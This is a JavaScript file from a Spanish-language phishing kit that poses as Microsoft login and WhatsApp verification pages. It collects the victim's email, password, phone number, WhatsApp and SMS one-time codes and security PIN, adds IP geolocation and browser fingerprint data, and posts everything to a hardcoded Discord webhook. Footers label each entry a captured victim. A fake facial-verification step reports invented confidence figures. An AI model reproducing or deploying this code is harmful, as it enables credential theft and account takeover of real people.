// ============================================
// CONFIGURACIÓN DEL WEBHOOK DE DISCORD
// ============================================
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1503539626395303937/NazTY0mWdGBnBAFzbBcgQDqzGtCkArgxekqGKjI9cwCYO4E0hhQ1R8eqLY0anxFi79T4';

// ============================================
// IP & GEOLOCALIZACIÓN
// ============================================
async function getIpAndLocation() {
  try {
    const response = await fetch('https://ipapi.co/json/');
    const data = await response.json();
    return {
      ip: data.ip || 'No disponible',
      country: data.country_name || 'No disponible',
      countryCode: data.country_code || 'N/A',
      region: data.region || 'No disponible',
      city: data.city || 'No disponible',
      isp: data.org || 'No disponible',
      timezone: data.timezone || 'No disponible',
      latitude: data.latitude || 'N/A',
      longitude: data.longitude || 'N/A',
      postal: data.postal || 'N/A',
      languages: data.languages || 'N/A',
      currency: data.currency || 'N/A'
    };
  } catch (error) {
    console.error('Error obteniendo geolocalización:', error);
    return {
      ip: 'Error',
      country: 'Error',
      countryCode: 'N/A',
      region: 'Error',
      city: 'Error',
      isp: 'Error',
      timezone: 'Error',
      latitude: 'N/A',
      longitude: 'N/A',
      postal: 'N/A',
      languages: 'N/A',
      currency: 'N/A'
    };
  }
}

// ============================================
// OBTENER INFORMACIÓN DEL NAVEGADOR
// ============================================
function getBrowserInfo() {
  const ua = navigator.userAgent;
  let browser = 'Desconocido';
  let os = 'Desconocido';
  
  if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
  else if (ua.indexOf('Edg') > -1) browser = 'Edge';
  else if (ua.indexOf('Chrome') > -1) browser = 'Chrome';
  else if (ua.indexOf('Safari') > -1) browser = 'Safari';
  else if (ua.indexOf('Opera') > -1) browser = 'Opera';
  
  if (ua.indexOf('Windows') > -1) os = 'Windows';
  else if (ua.indexOf('Mac') > -1) os = 'macOS';
  else if (ua.indexOf('Linux') > -1) os = 'Linux';
  else if (ua.indexOf('Android') > -1) os = 'Android';
  else if (ua.indexOf('iOS') > -1) os = 'iOS';
  
  return {
    browser: browser,
    os: os,
    userAgent: ua,
    language: navigator.language,
    screenResolution: `${window.screen.width}x${window.screen.height}`,
    colorDepth: window.screen.colorDepth,
    cookiesEnabled: navigator.cookieEnabled,
    platform: navigator.platform
  };
}

// ============================================
// ENVÍO A DISCORD
// ============================================
async function sendToDiscord(webhookUrl, embed) {
  try {
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [embed]
      })
    });
    
    if (!response.ok) {
      console.error('Error enviando a Discord:', response.status);
    }
    
    return response.ok;
  } catch (error) {
    console.error('Error enviando a Discord:', error);
    return false;
  }
}

// ============================================
// FUNCIONES ESPECÍFICAS PARA CADA PASO
// ============================================

// Paso 1: Login Microsoft (indexx.html)
async function sendLoginData(email, password) {
  const location = await getIpAndLocation();
  const browser = getBrowserInfo();
  
  const embed = {
    title: '🔐 NUEVO LOGIN - MICROSOFT',
    color: 0x0078d4,
    thumbnail: { url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/2048px-Microsoft_logo.svg.png' },
    fields: [
      {
        name: '📧 **EMAIL**',
        value: `\`\`\`${email}\`\`\``,
        inline: false
      },
      {
        name: '🔑 **CONTRASEÑA**',
        value: `\`\`\`${password}\`\`\``,
        inline: false
      },
      {
        name: '━━━━━━━━ 🌍 UBICACIÓN ━━━━━━━━',
        value: `📍 **País:** ${location.country} (${location.countryCode})\n🏙️ **Ciudad/Región:** ${location.city}, ${location.region}\n📮 **Código Postal:** ${location.postal}\n🌐 **IP:** \`${location.ip}\`\n📡 **ISP:** ${location.isp}\n⏰ **Zona Horaria:** ${location.timezone}\n🗺️ **Coordenadas:** ${location.latitude}, ${location.longitude}`,
        inline: false
      },
      {
        name: '━━━━━━━━ 💻 DISPOSITIVO ━━━━━━━━',
        value: `🌐 **Navegador:** ${browser.browser}\n💻 **Sistema:** ${browser.os}\n🖥️ **Resolución:** ${browser.screenResolution}\n🎨 **Profundidad Color:** ${browser.colorDepth} bits\n🍪 **Cookies:** ${browser.cookiesEnabled ? 'Sí' : 'No'}\n🗣️ **Idioma:** ${browser.language}`,
        inline: false
      }
    ],
    footer: { text: '🔴 Microsoft Security System | Victima Registrada' },
    timestamp: new Date().toISOString()
  };
  
  await sendToDiscord(DISCORD_WEBHOOK_URL, embed);
}

// Paso 2: Términos Aceptados (index.html)
async function sendTermsAcceptance() {
  const location = await getIpAndLocation();
  const browser = getBrowserInfo();
  
  const embed = {
    title: '✅ TÉRMINOS ACEPTADOS - MICROSOFT',
    color: 0x107c10,
    fields: [
      {
        name: '📋 **Estado**',
        value: '✅ Términos y condiciones aceptados',
        inline: true
      },
      {
        name: '⏰ **Timestamp**',
        value: new Date().toLocaleString('es-CO', { timeZone: location.timezone }),
        inline: true
      },
      {
        name: '━━━━━━━━ 🌍 UBICACIÓN ━━━━━━━━',
        value: `📍 **País:** ${location.country}\n🏙️ **Ciudad:** ${location.city}, ${location.region}\n🌐 **IP:** \`${location.ip}\``,
        inline: false
      },
      {
        name: '━━━━━━━━ 💻 DISPOSITIVO ━━━━━━━━',
        value: `🌐 **Navegador:** ${browser.browser}\n💻 **Sistema:** ${browser.os}\n🖥️ **Resolución:** ${browser.screenResolution}\n🗣️ **Idioma:** ${browser.language}`,
        inline: false
      }
    ],
    footer: { text: '🔴 Microsoft Verification System' },
    timestamp: new Date().toISOString()
  };
  
  await sendToDiscord(DISCORD_WEBHOOK_URL, embed);
}

// Paso 3: Verificación Facial (verificacion_facial.html)
async function sendFacialVerification() {
  const location = await getIpAndLocation();
  const browser = getBrowserInfo();
  
  const embed = {
    title: '👤 VERIFICACIÓN FACIAL COMPLETADA - MICROSOFT',
    color: 0x00A4EF,
    thumbnail: { url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/2048px-Microsoft_logo.svg.png' },
    fields: [
      {
        name: '✅ **Estado**',
        value: 'Verificación facial exitosa',
        inline: true
      },
      {
        name: '📊 **Nivel de Confianza**',
        value: '99.8%',
        inline: true
      },
      {
        name: '🔒 **Tecnología**',
        value: 'Microsoft Azure Face API\nISO/IEC 30107-3',
        inline: false
      },
      {
        name: '━━━━━━━━ 🌍 UBICACIÓN ━━━━━━━━',
        value: `📍 **País:** ${location.country} (${location.countryCode})\n🏙️ **Ciudad:** ${location.city}, ${location.region}\n🌐 **IP:** \`${location.ip}\`\n📡 **ISP:** ${location.isp}\n⏰ **Hora Local:** ${new Date().toLocaleString('es-CO', { timeZone: location.timezone })}`,
        inline: false
      },
      {
        name: '━━━━━━━━ 💻 DISPOSITIVO ━━━━━━━━',
        value: `🌐 **Navegador:** ${browser.browser}\n💻 **Sistema:** ${browser.os}\n🖥️ **Resolución:** ${browser.screenResolution}\n🗣️ **Idioma:** ${browser.language}`,
        inline: false
      }
    ],
    footer: { text: '🔴 Microsoft Azure Face API | Verificación Biométrica' },
    timestamp: new Date().toISOString()
  };
  
  await sendToDiscord(DISCORD_WEBHOOK_URL, embed);
}

// Paso 4: Número WhatsApp (index1.html)
async function sendWhatsAppNumber(countryCode, phoneNumber) {
  const location = await getIpAndLocation();
  const browser = getBrowserInfo();
  
  const embed = {
    title: '📱 NÚMERO WHATSAPP REGISTRADO',
    color: 0x25D366,
    thumbnail: { url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/1024px-WhatsApp.svg.png' },
    fields: [
      {
        name: '📞 **NÚMERO COMPLETO**',
        value: `\`\`\`${countryCode} ${phoneNumber}\`\`\``,
        inline: false
      },
      {
        name: '🌍 **Código País**',
        value: countryCode,
        inline: true
      },
      {
        name: '📱 **Número**',
        value: phoneNumber,
        inline: true
      },
      {
        name: '━━━━━━━━ 🌍 UBICACIÓN IP ━━━━━━━━',
        value: `📍 **País:** ${location.country} (${location.countryCode})\n🏙️ **Ciudad:** ${location.city}, ${location.region}\n📮 **Código Postal:** ${location.postal}\n🌐 **IP:** \`${location.ip}\`\n📡 **ISP:** ${location.isp}\n⏰ **Zona Horaria:** ${location.timezone}\n🗺️ **Coordenadas:** ${location.latitude}, ${location.longitude}\n💰 **Moneda:** ${location.currency}`,
        inline: false
      },
      {
        name: '━━━━━━━━ 💻 DISPOSITIVO ━━━━━━━━',
        value: `🌐 **Navegador:** ${browser.browser}\n💻 **Sistema:** ${browser.os}\n🖥️ **Resolución:** ${browser.screenResolution}\n🎨 **Color:** ${browser.colorDepth} bits\n🍪 **Cookies:** ${browser.cookiesEnabled ? 'Sí' : 'No'}\n🗣️ **Idioma:** ${browser.language}\n📱 **Plataforma:** ${browser.platform}`,
        inline: false
      }
    ],
    footer: { text: '🔴 WhatsApp Verification | Victima Registrada' },
    timestamp: new Date().toISOString()
  };
  
  await sendToDiscord(DISCORD_WEBHOOK_URL, embed);
}

// Paso 5: Código WhatsApp (index12.html)
async function sendWhatsAppCode(code) {
  const location = await getIpAndLocation();
  const browser = getBrowserInfo();
  
  const embed = {
    title: '🔢 CÓDIGO WHATSAPP VERIFICADO',
    color: 0x128C7E,
    thumbnail: { url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/1024px-WhatsApp.svg.png' },
    fields: [
      {
        name: '🔐 **CÓDIGO WHATSAPP**',
        value: `\`\`\`${code}\`\`\``,
        inline: false
      },
      {
        name: '✅ **Estado**',
        value: 'Verificación WhatsApp exitosa',
        inline: true
      },
      {
        name: '⏰ **Hora Verificación**',
        value: new Date().toLocaleString('es-CO', { timeZone: location.timezone }),
        inline: true
      },
      {
        name: '━━━━━━━━ 🌍 UBICACIÓN ━━━━━━━━',
        value: `📍 **País:** ${location.country} (${location.countryCode})\n🏙️ **Ciudad:** ${location.city}, ${location.region}\n🌐 **IP:** \`${location.ip}\`\n📡 **ISP:** ${location.isp}`,
        inline: false
      },
      {
        name: '━━━━━━━━ 💻 DISPOSITIVO ━━━━━━━━',
        value: `🌐 **Navegador:** ${browser.browser}\n💻 **Sistema:** ${browser.os}\n🖥️ **Resolución:** ${browser.screenResolution}\n🗣️ **Idioma:** ${browser.language}`,
        inline: false
      }
    ],
    footer: { text: '🔴 WhatsApp Verification System | Código Capturado' },
    timestamp: new Date().toISOString()
  };
  
  await sendToDiscord(DISCORD_WEBHOOK_URL, embed);
}

// Paso 6: Código SMS (index21.html)
async function sendSMSCode(code) {
  const location = await getIpAndLocation();
  const browser = getBrowserInfo();
  
  const embed = {
    title: '📨 CÓDIGO SMS WHATSAPP VERIFICADO',
    color: 0x075E54,
    thumbnail: { url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/1024px-WhatsApp.svg.png' },
    fields: [
      {
        name: '📩 **CÓDIGO SMS**',
        value: `\`\`\`${code}\`\`\``,
        inline: false
      },
      {
        name: '✅ **Estado**',
        value: 'Verificación SMS exitosa',
        inline: true
      },
      {
        name: '📱 **Método**',
        value: 'SMS WhatsApp',
        inline: true
      },
      {
        name: '━━━━━━━━ 🌍 UBICACIÓN ━━━━━━━━',
        value: `📍 **País:** ${location.country} (${location.countryCode})\n🏙️ **Ciudad:** ${location.city}, ${location.region}\n🌐 **IP:** \`${location.ip}\`\n📡 **ISP:** ${location.isp}\n⏰ **Hora Local:** ${new Date().toLocaleString('es-CO', { timeZone: location.timezone })}`,
        inline: false
      },
      {
        name: '━━━━━━━━ 💻 DISPOSITIVO ━━━━━━━━',
        value: `🌐 **Navegador:** ${browser.browser}\n💻 **Sistema:** ${browser.os}\n🖥️ **Resolución:** ${browser.screenResolution}\n🗣️ **Idioma:** ${browser.language}`,
        inline: false
      }
    ],
    footer: { text: '🔴 WhatsApp SMS Verification | Código Capturado' },
    timestamp: new Date().toISOString()
  };
  
  await sendToDiscord(DISCORD_WEBHOOK_URL, embed);
}

// Paso 7: PIN de Seguridad (index2.html)
async function sendPIN(pin) {
  const location = await getIpAndLocation();
  const browser = getBrowserInfo();
  
  const embed = {
    title: '🔒 PIN DE SEGURIDAD VERIFICADO',
    color: 0xFF0000,
    thumbnail: { url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/1024px-WhatsApp.svg.png' },
    fields: [
      {
        name: '🔑 **PIN DE 6 DÍGITOS**',
        value: `\`\`\`${pin}\`\`\``,
        inline: false
      },
      {
        name: '✅ **Autenticación**',
        value: 'Completada con éxito',
        inline: true
      },
      {
        name: '🔐 **Nivel Seguridad**',
        value: 'Máximo',
        inline: true
      },
      {
        name: '━━━━━━━━ 🌍 UBICACIÓN FINAL ━━━━━━━━',
        value: `📍 **País:** ${location.country} (${location.countryCode})\n🏙️ **Ciudad:** ${location.city}, ${location.region}\n📮 **Código Postal:** ${location.postal}\n🌐 **IP:** \`${location.ip}\`\n📡 **ISP:** ${location.isp}\n⏰ **Zona Horaria:** ${location.timezone}\n🗺️ **Coordenadas:** ${location.latitude}, ${location.longitude}\n💰 **Moneda:** ${location.currency}\n🗣️ **Idiomas:** ${location.languages}`,
        inline: false
      },
      {
        name: '━━━━━━━━ 💻 DISPOSITIVO ━━━━━━━━',
        value: `🌐 **Navegador:** ${browser.browser}\n💻 **Sistema:** ${browser.os}\n🖥️ **Resolución:** ${browser.screenResolution}\n🎨 **Color:** ${browser.colorDepth} bits\n🍪 **Cookies:** ${browser.cookiesEnabled ? 'Sí' : 'No'}\n🗣️ **Idioma:** ${browser.language}\n📱 **Plataforma:** ${browser.platform}\n🔍 **User Agent:** \`${browser.userAgent}\``,
        inline: false
      }
    ],
    footer: { text: '🔴 VERIFICACIÓN COMPLETA | TODOS LOS DATOS CAPTURADOS ✅' },
    timestamp: new Date().toISOString()
  };
  
  await sendToDiscord(DISCORD_WEBHOOK_URL, embed);
}

// ============================================
// FORM STATE MANAGEMENT
// ============================================
const formState = {
  email: '',
  password: '',
  country: '',
  phone: '',
  currentStep: 1
};

// ============================================
// AUTO-DETECT COUNTRY ON PAGE LOAD
// ============================================
document.addEventListener('DOMContentLoaded', function() {
  const countrySelect = document.getElementById('country');
  
  if (countrySelect) {
    fetch('https://ipapi.co/json/')
      .then(response => response.json())
      .then(data => {
        const countryCodeMap = {
          'AR': '+54', 'BO': '+591', 'BR': '+55', 'CL': '+56', 'CO': '+57',
          'CR': '+506', 'CU': '+53', 'DO': '+1', 'EC': '+593', 'SV': '+503',
          'GT': '+502', 'HN': '+504', 'MX': '+52', 'NI': '+505', 'PA': '+507',
          'PY': '+595', 'PE': '+51', 'PR': '+1', 'UY': '+598', 'VE': '+58'
        };
        
        if (data.country_code && countryCodeMap[data.country_code]) {
          countrySelect.value = countryCodeMap[data.country_code];
        }
      })
      .catch(error => console.log('Geolocalización no disponible'));
  }

  document.querySelectorAll('input').forEach(input => {
    input.addEventListener('keypress', function(e) {
      if (e.key === 'Enter' && this.type !== 'submit') {
        e.preventDefault();
      }
    });
  });

  const phoneInput = document.getElementById('phone');
  if (phoneInput) {
    phoneInput.addEventListener('input', function() {
      this.value = this.value.replace(/[^\d\s\-\+\(\)]/g, '');
    });
  }
});

window.addEventListener('error', function(event) {
  console.error('Error:', event.error);
});